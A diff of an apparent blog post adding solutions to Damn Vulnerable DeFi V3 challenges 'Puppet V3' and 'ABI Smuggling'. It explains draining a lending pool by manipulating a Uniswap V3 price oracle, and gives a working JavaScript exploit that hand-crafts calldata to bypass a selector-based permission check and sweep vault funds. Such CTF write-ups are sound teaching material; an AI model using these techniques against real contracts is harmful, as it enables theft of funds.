@@ -1,7 +1,7 @@
 ---
 title: 'Damn Vulnerable Defi V3 Solutions Part 3: 11-15'
 date: 2024-01-07T13:25:00+08:00
-draft: true
+draft: false
 tags: ["ctf"]
 ---
 
@@ -580,4 +580,95 @@ contract FakeAuthorizer is UUPSUpgradeable {
 
 ### 14. Puppet V3
 
+This challenge is similar to [Puppet V1](../damn-vulnerable-defi-v3-solutions-part-2/#8-puppet) and [Puppet V2](../damn-vulnerable-defi-v3-solutions-part-2/#9-puppet-v2), with the main distinction being its use of Uniswap V3 as an oracle. This post will not delve deeply into the intricacies of Uniswap V3, as it is quite complex and would necessitate a more detailed discussion.
+
+For this challenge, briefly, Uniswap V3 introduces the possibility of depleting a liquidity range, meaning the `DVT/ETH` price could theoretically escalate to infinite big if liquidity isn't provided across the entire range. This is precisely the scenario in this challenge, and not even a time-weighted average price oracle can mitigate this issue. Therefore, our strategy would be swapping all our DVT for ETH on Uniswap V3, drastically inflating the oracle price, and then taking out a loan from the lending pool. For those interested in learning more about Uniswap V3, the [Uniswap V3 Development Book](https://uniswapv3book.com/index.html) is an excellent resource.
+
+Price before swap:
+```
+[
+  BigNumber { value: "79228162514264337593543950336" },
+  0,
+  1,
+  40,
+  40,
+  0,
+  true,
+  sqrtPriceX96: BigNumber { value: "79228162514264337593543950336" },
+  tick: 0,
+  observationIndex: 1,
+  observationCardinality: 40,
+  observationCardinalityNext: 40,
+  feeProtocol: 0,
+  unlocked: true
+]
+```
+
+Price after swap:
+```
+
+[
+  BigNumber { value: "1461446703485210103287273052203988822378723970341" },
+  887271,
+  2,
+  40,
+  40,
+  0,
+  true,
+  sqrtPriceX96: BigNumber { value: "1461446703485210103287273052203988822378723970341" },
+  tick: 887271,
+  observationIndex: 2,
+  observationCardinality: 40,
+  observationCardinalityNext: 40,
+  feeProtocol: 0,
+  unlocked: true
+]
+```
+
 ### 15. ABI Smuggling
+
+This challenge is quite similar to [Ethernaut Challenge #29 Switch](../ethernaut-solutions-part-3/#29-switch), focusing on understanding `calldata` encoding and decoding. Essentially, calldata uses an offset to indicate the data location, followed by the data size and the data itself.
+
+For a detailed explanation, refer to the official Solidity documentation: : https://docs.soliditylang.org/en/v0.8.23/abi-spec.html#use-of-dynamic-types
+
+The `execute()` function in the `AuthorizedExecutor` checks the `4 + 32 * 3` position for the `actionData` selector. However, it's possible to alter the calldata to deceive the code, moving the real `actionData` to a different location.
+
+AuthorizedExecutor.sol:
+```sol
+    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
+        // Read the 4-bytes selector at the beginning of `actionData`
+        bytes4 selector;
+        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
+        assembly {
+            selector := calldataload(calldataOffset)
+        }
+        console.logBytes4(selector);
+        console.logBytes(actionData);
+
+        if (!permissions[getActionId(selector, msg.sender, target)]) {
+            revert NotAllowed();
+        }
+
+        _beforeFunctionCall(target, actionData);
+
+        return target.functionCall(actionData);
+    }
+```
+
+We can construct calldata that relocates the genuine `actionData` while maintaining the expected selector `d9caed12` at the `4 + 32 * 3` position. The solution would involve crafting of the calldata structure to align with these requirements.
+
+```js
+    it('Execution', async function () {
+        // So we can manipulate a calldata that allows the function `execute(address target, bytes calldata actionData)` to have the 
+        // `actionData` we need to call `sweepFunds`, while also bypassing the selector check.
+        const realPayload = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+        const payload = vault.interface.getSighash("execute")
+            + "0".repeat(24) + vault.address.slice(2)    // vault address.
+            + "0".repeat(62) + "80"                      // payload position.
+            + "0".repeat(64)                             // buffer.
+            + "d9caed12" + "0".repeat(56)                // bypass selector check.
+            + "0".repeat(62) + "44"                      // payload size.
+            + realPayload.slice(2);                      // actual calldata.
+        await player.sendTransaction({to: vault.address, data: payload, gasLimit: 500000});
+    });
+```
